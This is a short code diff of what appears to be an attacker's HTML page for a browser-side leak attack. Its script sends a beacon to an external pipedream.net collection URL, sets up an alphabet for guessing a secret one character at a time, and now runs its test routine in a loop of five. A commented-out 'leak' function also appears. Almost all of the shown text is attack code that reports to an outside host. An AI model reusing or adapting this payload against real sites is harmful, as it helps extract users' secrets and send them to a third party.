@@ -22,7 +22,7 @@
         }
 
     </script> -->
-    <script>
+    <script defer="">
         let cnt = 0
         fetch(`https://eoba3aqmrw0ajf6.m.pipedream.net/?presence=JeSuisLa`)
         let alpha = "abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_+="
@@ -47,9 +47,11 @@
                 });
             }
         }
+        while (cnt != 5) {
+            test()
+            cnt++
+        }
 
-        test()
-        cnt++
 
 
         // const leak = async (url, id) => {
